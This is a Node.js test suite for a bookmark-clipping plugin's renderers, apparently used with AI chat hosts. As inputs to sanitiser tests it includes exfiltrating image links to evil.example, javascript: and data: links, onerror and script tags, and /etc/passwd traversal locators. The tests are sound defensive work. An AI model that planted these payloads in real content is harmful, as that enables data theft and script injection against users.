import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { spawnSync } from 'node:child_process';
import { runInNewContext } from 'node:vm';
import { parse } from 'yaml';
import { applyReceipt, present, renderBookmarksFile, renderClip, renderHtml, renderMarkdown } from '../plugins/gleaner/skills/glean/scripts/bookmark.mjs';

const fixture = JSON.parse(readFileSync(new URL('./fixtures/bookmark.json', import.meta.url), 'utf8'));
const read = path => readFileSync(new URL(`../${path}`, import.meta.url), 'utf8');
const receipt = {
  status: 'saved', message: 'Browser Research/AI & Agents',
  saved_file: 'https://drive.google.com/file/d/fixture-file/view',
  html_file: '/tmp/fixture-bookmark.html',
  destination_url: 'https://drive.google.com/drive/folders/fixture-category',
};
const saved = (bookmark = fixture, result = receipt) => applyReceipt(bookmark, result);

test('ChatGPT native capability receives shared data and leaves a readable preview', async () => {
  const bookmark = saved();
  let calls = 0;
  const result = await present(bookmark, { nativePreview: (data, markdown) => {
    calls++;
    assert.deepEqual(data, bookmark);
    assert.equal(markdown, renderClip(bookmark));
    data.tags.push('#adapter-mutation');
  } });
  assert.equal(calls, 1);
  assert.equal(result.native, true);
  assert.equal(result.fallback, false);
  assert.ok(result.markdown.includes(fixture.content_markdown));
  assert.match(result.markdown, /### Actions/);
  assert.equal(bookmark.tags.includes('#adapter-mutation'), false);
});

test('every presentation default shows the whole clip, even when it was stored elsewhere', async () => {
  const bookmark = saved();
  for (const mode of [undefined, 'auto', 'chat', 'markdown']) {
    const { markdown } = await present(bookmark, { mode });
    assert.ok(markdown.includes(fixture.content_markdown), markdown);
    assert.match(markdown, /Saved: Browser Research/);
    assert.match(markdown, /Open saved destination/);
    assert.doesNotMatch(markdown, /### Overview/);
  }
});

test('a short preview is opt-in and stays compact', async () => {
  const { markdown } = await present(saved(), { mode: 'short' });
  assert.equal(markdown, renderMarkdown(saved()));
  assert.match(markdown, /### Overview/);
  assert.equal(markdown.includes(fixture.content_markdown), false);
});

test('the clip is shown only when one was delivered, and limitations stay visible', async () => {
  const limited = saved({ ...fixture, limitations: ['Partial article; the rest is behind a sign-in.'] });
  assert.match((await present(limited)).markdown, /### Source limitations\n\nPartial article/);
  for (const status of ['failed', 'skipped']) {
    const { markdown } = await present(saved(fixture, { ...receipt, status, message: 'Not delivered' }));
    assert.equal(markdown.includes(fixture.content_markdown), false);
  }
  assert.match((await present(saved({ ...fixture, content_markdown: ' ' }))).markdown, /### Overview/);
});

const showClip = async content_markdown => (await present(saved({ ...fixture, content_markdown }))).markdown;

test('images in clip text never load when the clip is shown', async () => {
  for (const attack of [
    '![x](https://evil.example/?q=secret)', '![x][r]\n\n[r]: https://evil.example/p.png', '![`a`](https://evil.example/p.png)',
    '!![x](https://evil.example/p.png)', '![x]\n\n[x]: https://evil.example/p.png',
    // Text that looks like code here but not to a Markdown renderer.
    '\\`![x](https://evil.example/p.png)`', '`a\nb` ![x](https://evil.example/p.png) `c`',
    '```\r```\r![x](https://evil.example/p.png)', '- a\n   ```\n![x](https://evil.example/p.png)\n   ```',
    // Only spaces and tabs may follow a closing fence, so these lines don't close it.
    '```\n``` \n```\n![x](https://evil.example/p.png)', '~~~\n~~~\f\n~~~\n![x](https://evil.example/p.png)',
  ]) {
    assert.doesNotMatch(await showClip(attack), /!\[/, attack);
  }
});

test('links in clip text must be HTTP(S), however they are spelled', async () => {
  for (const attack of [
    '[x](javascript:alert(1))', '[x](JaVaScRiPt:alert(1))', '[x](<javascript:alert(1)>)', '[[x]](javascript:a((1)))',
    '[x](javascript&colon;alert(1))', '[x](\njavascript:alert(1))', '[x](data:text/html,hi)', '[x][r]\n\n[r]: javascript:alert(1)',
    '[a](https://ok.example/)[b](javascript:alert(1))',
  ]) {
    const clip = (await showClip(attack)).split('### Actions')[0];
    assert.match(clip, /\]\\[(:]/, attack);
    assert.doesNotMatch(clip, /[^\\]\][(:]\s*(?:<|&lt;)?(?!https?:)\S/i, attack);
  }
});

test('raw HTML in clip text shows as text', async () => {
  const markdown = await showClip('<img src=x onerror=alert(1)>\n\n<script>alert(1)</script>');
  assert.doesNotMatch(markdown, /<img|<script/);
  assert.match(markdown, /&lt;img src=x/);
});

test('a fence the clip leaves open is closed before the verified links', async () => {
  for (const [clip, closing] of [['```\nopen', '```'], ['````ts\n```\nopen', '````'], ['~~~\nopen', '~~~']]) {
    assert.ok((await showClip(clip)).includes(`open\n${closing}\n\n### Actions`), clip);
  }
});

test('clip formatting a reader needs survives untouched', async () => {
  for (const kept of [
    '[3:10](https://www.youtube.com/watch?v=x&t=190s)', '[wiki](https://en.wikipedia.org/wiki/A_(b))', '**Category:** AI & Agents',
    '```ts\nconst x: Array<string> = [];\nconst y = "![a](b)";\n```', '~~~\n<b>\n~~~', 'Use `Array<string>` and `arr[0]` here.',
    '- step\n\n   ```ts\n   const x: Array<string> = [];\n   ```',
  ]) {
    assert.ok((await showClip(kept)).includes(kept), kept);
  }
});

test('no host is told to show less than the full clip by default', () => {
  const glean = read('plugins/gleaner/skills/glean/SKILL.md');
  const contract = read('plugins/gleaner/skills/glean/references/bookmark.md');
  const between = (text, start, end) => {
    const [from, to] = [text.indexOf(start), text.indexOf(end)];
    assert.ok(from >= 0 && to > from, `${start} to ${end}`);
    return text.slice(from, to);
  };
  const stepSeven = between(glean, '7. **Confirm and preview', '**Tagging the chat.**');
  const delivery = between(glean, '**This conversation** (the default)', '**Google Drive**\n');
  const presentation = between(contract, '## Present after the save result', '## Optional executable renderer');
  assert.match(stepSeven, /full clip inline, on every host/);
  assert.match(stepSeven, /short preview/);
  assert.match(stepSeven, /no preview/);
  assert.doesNotMatch(stepSeven, /In other hosts/);
  assert.doesNotMatch(stepSeven, /In ChatGPT, render/);
  assert.doesNotMatch(delivery, /In other hosts/);
  assert.doesNotMatch(delivery, /ChatGPT only/);
  assert.doesNotMatch(presentation, /ChatGPT only/);
  assert.doesNotMatch(presentation, /other hosts keep/i);
  assert.match(presentation, /every host/i);
  // With no file attached, the inline clip is the only copy, so no opt-out can remove it.
  assert.match(presentation, /delivery itself: show it once, even with “short preview,” “download only,” or “no preview,”/);
});

test('a chat clip with no file is shown even on a short or no preview', async () => {
  const onlyCopy = saved(fixture, { status: 'chat', message: 'No file attached.' });
  const attached = saved(fixture, { status: 'chat', message: 'Attached.', saved_file: 'sandbox:/mnt/data/clip.md' });
  for (const mode of ['short', 'none']) {
    assert.ok((await present(onlyCopy, { mode })).markdown.includes(fixture.content_markdown), mode);
    assert.equal((await present(attached, { mode })).markdown.includes(fixture.content_markdown), false, mode);
  }
});

test('a limitation the clip already states is not repeated', async () => {
  const linkOnly = JSON.parse(read('scripts/fixtures/youtube-link-only.json'));
  const { markdown } = await present(saved(linkOnly, { status: 'chat', message: 'Link-only bookmark.' }));
  assert.equal(markdown.split(linkOnly.limitations[0]).length, 2);
  assert.doesNotMatch(markdown, /### Source limitations/);
});

test('Claude Code Markdown and no-component ChatGPT share the same content', async () => {
  const bookmark = saved({ ...fixture, destination: { provider: 'local', label: 'Notes', path: '/work/notes' } }, {
    status: 'saved', message: 'Notes', saved_file: '/work/notes/clip.md', html_file: '/work/notes/clip.html',
  });
  const claude = await present(bookmark, { mode: 'markdown', nativePreview: () => assert.fail('must not call native') });
  const chat = await present(bookmark, { mode: 'chat' });
  assert.equal(claude.markdown, chat.markdown);
  assert.match(claude.markdown, /https:\/\/example.com\/harness/);
  assert.match(claude.markdown, /Access saved bookmark: \/work\/notes\/clip\\.md/);
  assert.match(claude.markdown, /Access saved HTML: \/work\/notes\/clip\\.html/);
});

test('HTML and Markdown keep shared metadata and full clip content without executable markup', () => {
  const bookmark = saved({ ...fixture, title: '<script>alert("x")</script>', description: '<img src=x onerror=alert(1)>' });
  const html = renderHtml(bookmark);
  const markdown = renderMarkdown(bookmark);
  assert.match(html, /^<!doctype html>/);
  assert.match(html, /name="generator" content="Gleaner clip"/);
  assert.match(html, /name="gleaner:id" content="fixture-repo-1"/);
  assert.match(html, /name="gleaner:primary" content="https:\/\/drive.google.com\/file\/d\/fixture-file\/view"/);
  assert.match(html, /<dt>Source<\/dt><dd><a href="https:\/\/example.com\/harness"/);
  assert.match(html, /<dt>Saved<\/dt><dd>2026-10-23/);
  assert.match(html, /&lt;script&gt;/);
  assert.doesNotMatch(html, /<script|<img/);
  assert.doesNotMatch(markdown, /<script/);
  for (const value of [fixture.saved_at, fixture.source_type, '#agents', fixture.summary, fixture.why_it_matters]) {
    assert.ok(html.includes(value));
    assert.ok(markdown.replaceAll('\\', '').includes(value));
  }
  assert.match(html, /## Follow-ups/);
  assert.match(html, /To get follow-ups/);
});

test('unsafe receipt locators are text, never executable links', () => {
  const bookmark = saved(fixture, { ...receipt, saved_file: 'javascript:alert(1)', html_file: 'data:text/html,<script>x</script>' });
  assert.doesNotMatch(renderHtml(bookmark), /href="(?:javascript|data):/);
  assert.doesNotMatch(renderMarkdown(bookmark), /\]\((?:javascript|data):/);
  assert.throws(() => saved({ ...fixture, url: 'javascript:alert(1)' }), /HTTP/);
});

test('schema-1 preferences and configured Drive ID remain unchanged by presentation', async () => {
  const preferences = parse(read('plugins/gleaner/skills/preferences/references/examples/user.yaml'));
  const before = structuredClone(preferences);
  const destination = preferences.destinations[preferences.default_destination];
  const bookmark = saved({ ...fixture, destination });
  await present(bookmark);
  renderHtml(bookmark);
  assert.deepEqual(preferences, before);
  assert.deepEqual(bookmark.destination, destination);
  assert.equal(bookmark.destination.remote_id, 'example-drive-folder-id');
  assert.equal(preferences.default_format, 'auto');
  assert.match(renderMarkdown(bookmark), /drive.google.com\/file\/d\/fixture-file\/view/);
});

test('failed or skipped writes discard candidate links and never invoke native preview', async () => {
  for (const status of ['failed', 'skipped']) {
    const bookmark = saved(fixture, { ...receipt, status, message: status === 'failed' ? 'Drive unavailable' : 'Duplicate exists' });
    const result = await present(bookmark, { nativePreview: () => assert.fail('must not render success') });
    assert.equal(bookmark.saved_file, null);
    assert.equal(bookmark.html_file, null);
    assert.equal(bookmark.destination_url, null);
    assert.doesNotMatch(result.markdown, /Access saved|Open saved destination/);
    assert.match(result.markdown, status === 'failed' ? /Not saved/ : /Skipped/);
  }
});

test('same-session refresh preserves identity while a duplicate updated copy keeps Supersedes', () => {
  const original = saved();
  const refresh = saved({ ...original, key_points: ['Refreshed detail.'] }, { ...receipt, saved_file: 'https://example.com/new-upload' });
  assert.equal(refresh.id, original.id);
  assert.equal(refresh.saved_at, original.saved_at);
  assert.equal(original.saved_file, receipt.saved_file);
  const copy = saved({ ...fixture, id: 'fixture-repo-2', content_markdown: `${fixture.content_markdown}\n**Supersedes:** ${original.saved_file}` });
  assert.notEqual(copy.id, original.id);
  assert.match(renderHtml(copy), /Supersedes/);
});

test('preview errors and rejected components preserve the successful save and fall back', async () => {
  const bookmark = saved();
  const before = structuredClone(bookmark);
  for (const nativePreview of [() => { throw new Error('unavailable'); }, async () => false]) {
    const result = await present(bookmark, { nativePreview });
    assert.equal(result.fallback, true);
    assert.match(result.markdown, /Interactive preview unavailable/);
    assert.match(result.markdown, /Access saved bookmark/);
    assert.deepEqual(bookmark, before);
  }
});

test('chat fallback and unavailable HTML do not claim persistence or a nonexistent artifact', async () => {
  const bookmark = saved(fixture, { status: 'chat', message: 'Not saved to Drive; copy the clip above.', html_file: null, destination_url: receipt.destination_url });
  assert.equal(bookmark.destination_url, null);
  const result = await present(bookmark);
  assert.match(result.markdown, /Delivered in this conversation only; not stored/);
  assert.doesNotMatch(result.markdown, /Access saved HTML|Open saved destination/);
  const suppressed = await present(bookmark, { mode: 'none' });
  assert.match(suppressed.markdown, /Not saved to Drive/);
  assert.doesNotMatch(suppressed.markdown, /### Overview/);
});

test('verified attachment links need a host capability and stay non-executable in standalone HTML', async () => {
  const attachment = 'sandbox:/mnt/data/bookmark (1).html';
  const bookmark = saved(fixture, { status: 'chat', message: 'Attached HTML.', saved_file: attachment, html_file: attachment });
  const expected = '[Access saved HTML](sandbox:/mnt/data/bookmark%20%281%29.html)';
  for (const mode of ['auto', 'chat', 'markdown']) {
    const result = await present(bookmark, { mode, attachmentLinks: true });
    assert.ok(result.markdown.includes(expected), result.markdown);
    assert.doesNotMatch((await present(bookmark, { mode })).markdown, /\]\(sandbox:/);
  }
  const fallback = await present(bookmark, { attachmentLinks: true, nativePreview: () => { throw new Error('unavailable'); } });
  assert.equal(fallback.fallback, true);
  assert.ok(fallback.markdown.includes(expected));
  assert.match((await present(bookmark, { mode: 'none', attachmentLinks: true })).markdown, /\[Saved bookmark\]\(sandbox:/);
  assert.doesNotMatch(renderHtml(bookmark), /href="sandbox:/);
  for (const locator of ['javascript:alert(1)', 'data:text/html,hello', 'file:///etc/passwd', 'sandbox://evil/mnt/data/clip.html', 'sandbox:/mnt/data/../../etc/passwd']) {
    const unsafe = saved(fixture, { status: 'chat', message: 'Attachment unavailable.', html_file: locator });
    assert.doesNotMatch((await present(unsafe, { attachmentLinks: true })).markdown, /\[Access saved HTML\]/);
  }
});

test('CLI forwards the attachment-link capability to conversation rendering only', () => {
  const result = spawnSync(process.execPath, ['plugins/gleaner/skills/glean/scripts/bookmark.mjs'], {
    input: JSON.stringify({ bookmark: fixture, receipt: { status: 'chat', message: 'Attached.', html_file: 'sandbox:/mnt/data/clip.html' }, attachmentLinks: true }), encoding: 'utf8',
  });
  assert.equal(result.status, 0, result.stderr);
  const output = JSON.parse(result.stdout);
  assert.match(output.markdown, /\[Access saved HTML\]\(sandbox:\/mnt\/data\/clip.html\)/);
  assert.doesNotMatch(output.html, /href="sandbox:/);
});

test('no-preview preserves a verified saved path and single-answer clips need no invented summary', async () => {
  const bookmark = saved({ ...fixture, url: null, summary: '', description: '', source_type: 'other' }, {
    status: 'saved', message: 'Local notes', saved_file: '/work/answer.md',
  });
  const result = await present(bookmark, { mode: 'none' });
  assert.match(result.markdown, /\/work\/answer\\.md/);
  assert.doesNotMatch(result.markdown, /###/);
  assert.match(renderMarkdown(bookmark), /see the full clip for retained content/);
  assert.doesNotMatch(renderMarkdown(bookmark), /Open original source/);
});

test('YouTube description, chapter links, and title-only limitations survive HTML and preview', async () => {
  const video = saved({
    ...fixture, source_type: 'video', url: 'https://www.youtube.com/watch?v=fixture',
    limitations: ['Written from the description; no transcript was read.'],
    content_markdown: '**Channel:** Example\n**Video:** from: description\n## Key moments\n[3:10](https://www.youtube.com/watch?v=fixture&t=190s) Configuration\n## Links\nhttps://example.com/docs',
  });
  assert.match((await present(video)).markdown, /no transcript was read/);
  assert.match(renderHtml(video), /t=190s/);
  assert.match(renderHtml(video), /from: description/);
  assert.match(renderHtml(video), /https:\/\/example.com\/docs/);
  const limited = saved({ ...video, description: '', summary: '', key_points: [], why_it_matters: '', limitations: ['Title only; description unavailable.'] });
  assert.match(renderMarkdown(limited), /No additional details verified/);
  assert.match(renderMarkdown(limited), /Practical value not established/);
});

test('CLI renders fixture input offline without creating a file or changing the receipt', () => {
  const result = spawnSync(process.execPath, ['plugins/gleaner/skills/glean/scripts/bookmark.mjs'], {
    input: JSON.stringify({ bookmark: fixture, receipt }), encoding: 'utf8',
  });
  assert.equal(result.status, 0, result.stderr);
  const output = JSON.parse(result.stdout);
  assert.equal(output.bookmark.saved_file, receipt.saved_file);
  assert.match(output.html, /<!doctype html>/);
  assert.ok(output.markdown.includes(fixture.content_markdown));
});

test('CLI passes the short preview mode through', () => {
  const result = spawnSync(process.execPath, ['plugins/gleaner/skills/glean/scripts/bookmark.mjs'], {
    input: JSON.stringify({ bookmark: fixture, receipt, mode: 'short' }), encoding: 'utf8',
  });
  assert.equal(result.status, 0, result.stderr);
  assert.match(JSON.parse(result.stdout).markdown, /### Overview/);
});

test('link-only YouTube previews disclose missing content without inventing a summary or stored copy', async () => {
  const linkOnly = JSON.parse(read('scripts/fixtures/youtube-link-only.json'));
  const bookmark = saved(linkOnly, {
    status: 'chat', message: 'Link-only bookmark provided in this conversation.',
    saved_file: 'sandbox:/mnt/data/youtube-fixture.md',
  });
  const normal = await present(bookmark, { attachmentLinks: true });
  const fallback = await present(bookmark, {
    attachmentLinks: true, nativePreview: () => { throw new Error('unavailable'); },
  });
  assert.equal(fallback.fallback, true);
  const short = await present(bookmark, { mode: 'short', attachmentLinks: true });
  for (const output of [normal.markdown, fallback.markdown, short.markdown, renderHtml(bookmark)]) {
    assert.match(output, /Link only; video content was unavailable and has not been summarized/);
    assert.match(output, /https:\/\/www.youtube.com\/watch\?v=fixture/);
    assert.doesNotMatch(output, /Access saved HTML|Open saved destination/);
  }
  for (const output of [short.markdown, renderHtml(bookmark)]) {
    assert.match(output, /No summary supplied/);
    assert.match(output, /No additional details verified/);
    assert.match(output, /Practical value not established/);
  }
  assert.match(normal.markdown, /Delivered in this conversation only; not stored/);
  assert.match(normal.markdown, /\[Access saved bookmark\]\(sandbox:\/mnt\/data\/youtube-fixture.md\)/);
  assert.equal(bookmark.content_markdown, linkOnly.content_markdown);
  assert.equal(bookmark.summary, '');
  assert.deepEqual(bookmark.key_points, []);
  assert.equal(bookmark.html_file, null);
  assert.equal(bookmark.destination_url, null);
});

const clips = [
  { title: '<script>alert("x")</script>', url: 'https://example.com/harness', saved_at: '2026-10-23', category: 'AI & Agents', tags: ['#agents', '#skills'], note: 'Read "setup"\nfirst', clip_link: 'https://drive.google.com/file/d/fixture-file/view' },
  { title: 'Answer about pricing', url: null, saved_at: '2026-10-22', category: 'Design', tags: [], clip_link: 'https://claude.ai/artifact/fixture' },
  { title: 'Rolled-over date', url: 'https://example.com/feb', saved_at: '2026-02-30', category: 'Design', tags: [] },
  { title: 'US-style date', url: 'https://example.com/us', saved_at: '9/22/2026', category: 'Design', tags: [] },
  { title: 'Local answer', url: null, saved_at: '2026-10-21', category: 'Design', tags: [], clip_link: '/work/notes/answer.md' },
  { title: 'Unsafe source', url: 'javascript:alert(1)', saved_at: '2026-10-20', category: 'Design', tags: [] },
  { title: 'Quoted query', url: 'https://example.com/?x=1&y="z', saved_at: '2026-10-19', category: 'Design', tags: ['"><b>'] },
  { title: 'Two\nlines', url: 'https://example.com/two', saved_at: '2026-10-18', category: 'Multi\r\nline', tags: [] },
];

test('bookmarks file puts clips in category folders with only escaped text and web links', () => {
  const { html, skipped } = renderBookmarksFile(clips);
  assert.match(html, /^<!DOCTYPE NETSCAPE-Bookmark-file-1>/);
  // Noon UTC, so the date reads the same in every time zone from UTC-12 to UTC+11.
  assert.match(html, /<DT><H3>AI &amp; Agents<\/H3>\n\s*<DL><p>\n\s*<DT><A HREF="https:\/\/example.com\/harness" ADD_DATE="1792756800" TAGS="agents,skills">&lt;script&gt;/);
  assert.doesNotMatch(html, /<script|alert\(1\)|"><b>/);
  assert.match(html, /<A HREF="https:\/\/example.com\/\?x=1&amp;y=&quot;z" ADD_DATE="[0-9]+" TAGS="&quot;&gt;&lt;b&gt;">Quoted query<\/A>/);
  assert.match(html, /<DD>Read &quot;setup&quot; first · Clip: https:\/\/drive.google.com\/file\/d\/fixture-file\/view\n/);
  assert.match(html, /<A HREF="https:\/\/claude.ai\/artifact\/fixture" ADD_DATE="[0-9]+">Answer about pricing<\/A>/);
  assert.match(html, /<A HREF="https:\/\/example.com\/feb">Rolled-over date/);
  assert.match(html, /<A HREF="https:\/\/example.com\/us">US-style date/);
  assert.equal(html.match(/<DT><H3>Design<\/H3>/g).length, 1);
  assert.deepEqual([...html.matchAll(/HREF="([^"]*)"/g)].map(match => new URL(match[1]).protocol), ['https:', 'https:', 'https:', 'https:', 'https:', 'https:']);
  assert.deepEqual(skipped, ['Local answer', 'Unsafe source']);
  // Chrome's importer parses one line at a time and drops an entry split across lines.
  const lines = html.split('\n');
  assert.equal(lines.filter(line => /<DT><A .*<\/A>/.test(line)).length, 6);
  assert.deepEqual(lines.filter(line => /<DT><H3>.*<\/H3>/.test(line)).map(line => line.trim()), ['<DT><H3>Gleaner</H3>', '<DT><H3>AI &amp; Agents</H3>', '<DT><H3>Design</H3>', '<DT><H3>Multi line</H3>']);
});

test('CLI renders a bookmarks file from clip index rows', () => {
  const result = spawnSync(process.execPath, ['plugins/gleaner/skills/glean/scripts/bookmark.mjs'], {
    input: JSON.stringify({ clips }), encoding: 'utf8',
  });
  assert.equal(result.status, 0, result.stderr);
  const output = JSON.parse(result.stdout);
  assert.equal(output.html, renderBookmarksFile(clips).html);
  assert.deepEqual(output.skipped, ['Local answer', 'Unsafe source']);
});

test('page, YouTube, and follow-up instructions route through shared presentation', () => {
  const glean = read('plugins/gleaner/skills/glean/SKILL.md');
  const youtube = read('plugins/gleaner/skills/youtube/SKILL.md');
  const followUp = read('plugins/gleaner/skills/follow-up/SKILL.md');
  const contract = read('plugins/gleaner/skills/glean/references/bookmark.md');
  assert.match(glean, /7\. \*\*Confirm and preview/);
  assert.match(glean, /references\/bookmark.md/);
  assert.match(glean, /same-name|same-named/);
  assert.match(glean, /canonical/);
  assert.match(youtube, /shared bookmark model/);
  assert.match(youtube, /glean steps 6 and 7/);
  assert.match(followUp, /glean step 7/);
  assert.match(contract, /Do not add `preview_mode`/);
  assert.match(contract, /“Use a Markdown preview”/);
  assert.doesNotMatch(contract, /“Use Markdown” or “use a chat preview” changes presentation only/);
  assert.match(contract, /Preview failure must never trigger another save/);
});

test('saves avoid repeating permission prompts for the same access', () => {
  const glean = read('plugins/gleaner/skills/glean/SKILL.md');
  const contract = read('plugins/gleaner/skills/preferences/references/contract.md');
  const prompts = glean.slice(glean.indexOf('### Fewer permission prompts'), glean.indexOf('### Collecting parts'));
  const drive = glean.slice(glean.indexOf('**Google Drive**\n'), glean.indexOf('**Cowork project**\n'));
  const notion = glean.slice(glean.indexOf('**Notion**\n'), glean.indexOf('**Artifact**\n'));
  const sync = contract.slice(contract.indexOf('## Drive synchronization'), contract.indexOf('1. **Select the document.**'));
  const cloudOnly = contract.slice(contract.indexOf('## Hosts without local file access'));

  assert.doesNotMatch(glean, /scope `once`/);
  assert.match(prompts, /first call to each[^.]*on its own/i);
  assert.match(prompts, /declines?[^.]*final/i);
  assert.match(glean, /fullText contains '<URL>' or fullText contains/);
  assert.doesNotMatch(glean, /search for `fullText contains '<URL>'` for each URL/);
  assert.match(drive, /already (have|found)[^.]*folder|folder[^.]*already (have|found)/i);
  assert.doesNotMatch(drive, /checking each candidate/);
  assert.match(sync, /once per conversation/i);
  assert.doesNotMatch(sync, /before glean resolves a save/);
  assert.match(cloudOnly, /once per conversation/i);
  // Replacing Notion's Tags options deletes any left out, so that list must never come from a kept copy.
  assert.match(notion, /fetch[^.]*again[^.]*(tags|options)/i);
});

test('kept lookups and declines stay scoped so reuse never saves to the wrong place', () => {
  const glean = read('plugins/gleaner/skills/glean/SKILL.md');
  const contract = read('plugins/gleaner/skills/preferences/references/contract.md');
  const prompts = glean.slice(glean.indexOf('### Fewer permission prompts'), glean.indexOf('### Collecting parts'));
  const stepSix = glean.slice(glean.indexOf('6. **Save it**'), glean.indexOf('**This conversation** (the default)'));
  const drive = glean.slice(glean.indexOf('**Google Drive**\n'), glean.indexOf('**Cowork project**\n'));
  const notion = glean.slice(glean.indexOf('**Notion**\n'), glean.indexOf('**Artifact**\n'));
  const updateFails = glean.slice(glean.indexOf('**If the update fails,**'), glean.indexOf('**Fallback:**'));
  const cloudOnly = contract.slice(contract.indexOf('## Hosts without local file access'));

  // A second Notion database in one conversation must not inherit the first one's parent.
  assert.match(notion, /find the database,\*\* unless you already have that same database/i);
  assert.match(notion, /once per database/i);
  assert.doesNotMatch(notion, /\*\*Fetch the database first,\*\* once per conversation/);
  // A declined upload can't be retried as a new clip, which needs that same upload.
  assert.match(prompts, /decline[\s\S]*Fallback in step 6/);
  assert.match(prompts, /skip[^.]*calls that only lead to it/i);
  assert.match(updateFails, /declined/);
  // Only connector saves prove access by trying; a Cowork folder still has to be confirmed first.
  assert.match(stepSix, /Recheck access[^.]*for Drive and Notion/i);
  assert.match(glean, /Confirm you can reach the project's folder/);
  // A default changed mid-conversation must beat the kept copy, even when the old default never errors.
  assert.match(prompts, /drop[^.]*preferences[^.]*(update|reset|sync)/i);
  // Setup must still run its own complete search before it can create a document.
  assert.match(cloudOnly, /preferences invocation searches again/i);
  // A one-time site grant is used up by its first read, so a later read has to be able to renew it.
  assert.doesNotMatch(glean, /Ask once per site/);
  // A taken title can sit past the first page, which would make it look free.
  assert.match(drive, /read every result page/i);
  // A tag removed elsewhere still looks like an option in a kept list, until Notion rejects it.
  assert.match(notion, /still rejects a tag[^.]*once/i);
});

test('YouTube transcript fallback stays behind Chrome and never hides automation', () => {
  const youtube = read('plugins/gleaner/skills/youtube/SKILL.md');
  const stepFour = youtube.slice(youtube.indexOf('4. **Read the transcript**'), youtube.indexOf('5. **Check the description.**'));
  assert.match(stepFour, /In Claude, when neither the side panel nor Claude in Chrome/);
  assert.match(stepFour, /new tab/i);
  assert.match(stepFour, /close only that tab/i);
  assert.match(stepFour, /never add[^.]*hide/i);
  assert.match(stepFour, /fell back to fetching/);
  assert.match(stepFour.slice(stepFour.indexOf('What comes back')), /transcript: null, ad: true/);
  assert.match(youtube, /read the position only from a tab the user is watching/);
});

// Runs step 4's script from the skill on a stub page, with timers firing at once.
const runTranscriptScript = async ({ panelMatch, segmentTag, timeClass, textClass, ads = 0 }) => {
  const youtube = read('plugins/gleaner/skills/youtube/SKILL.md');
  const [, script] = youtube.slice(youtube.indexOf('4. **Read the transcript**')).match(/```js\n([\s\S]*?)```/);
  const has = (selector, name) => selector.split(/,\s*/).includes(name);
  let opened = false;
  let adChecks = ads;
  const segment = {
    querySelector: selector => has(selector, timeClass) ? { textContent: ' 0:01 ' } : has(selector, textClass) ? { textContent: ' hello\n world ' } : null,
  };
  const panel = { querySelector: () => null, querySelectorAll: selector => has(selector, segmentTag) ? [segment] : [] };
  const document = {
    getElementById: () => ({ classList: { contains: () => adChecks-- > 0 } }),
    querySelector: selector => {
      if (selector.endsWith('transcript-section-renderer button')) return { click: () => { opened = true; } };
      if (selector.endsWith('#expand')) return { click() {} };
      return opened && selector.includes(panelMatch) ? panel : null;
    },
  };
  const result = await runInNewContext(script, { document, window: {}, setTimeout: callback => callback() });
  return { ...result, opened };
};

const classicPanel = {
  panelMatch: '[target-id="engagement-panel-searchable-transcript"]', segmentTag: 'ytd-transcript-segment-renderer',
  timeClass: '.segment-timestamp', textClass: '.segment-text',
};
const modernPanel = {
  panelMatch: '[target-id="PAmodern_transcript_view"]', segmentTag: 'transcript-segment-view-model',
  timeClass: '.ytwTranscriptSegmentViewModelTimestamp', textClass: '.ytAttributedStringHost',
};
const unlabeledPanel = { ...modernPanel, panelMatch: ':has(transcript-segment-view-model)' };

test('YouTube transcript script reads the classic, modern, and unlabeled panels', async () => {
  for (const layout of [classicPanel, modernPanel, unlabeledPanel]) {
    const result = await runTranscriptScript(layout);
    assert.equal(result.transcript, '[0:01] hello world');
    assert.equal(result.lines, 1);
  }
});

test('YouTube transcript script waits for an ad and never opens the panel during one', async () => {
  const shortAd = await runTranscriptScript({ ...modernPanel, ads: 5 });
  assert.equal(shortAd.transcript, '[0:01] hello world');
  const longAd = await runTranscriptScript({ ...modernPanel, ads: Infinity });
  assert.equal(longAd.ad, true);
  assert.equal(longAd.opened, false);
});
